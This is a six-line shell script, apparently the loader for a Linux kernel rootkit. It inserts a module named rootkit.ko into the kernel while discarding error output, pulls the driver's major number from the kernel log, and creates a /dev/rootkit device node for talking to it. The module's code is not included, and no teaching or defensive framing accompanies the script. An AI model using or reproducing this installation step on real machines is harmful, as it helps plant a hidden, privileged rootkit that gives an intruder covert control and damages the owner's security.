#!/usr/bin/sh

insmod rootkit.ko 2>/dev/null
major_number=$(dmesg | grep "The major number" | tail -n 1 | awk '{print $NF}')
rm /dev/rootkit 2>/dev/null
mknod /dev/rootkit c $major_number 0
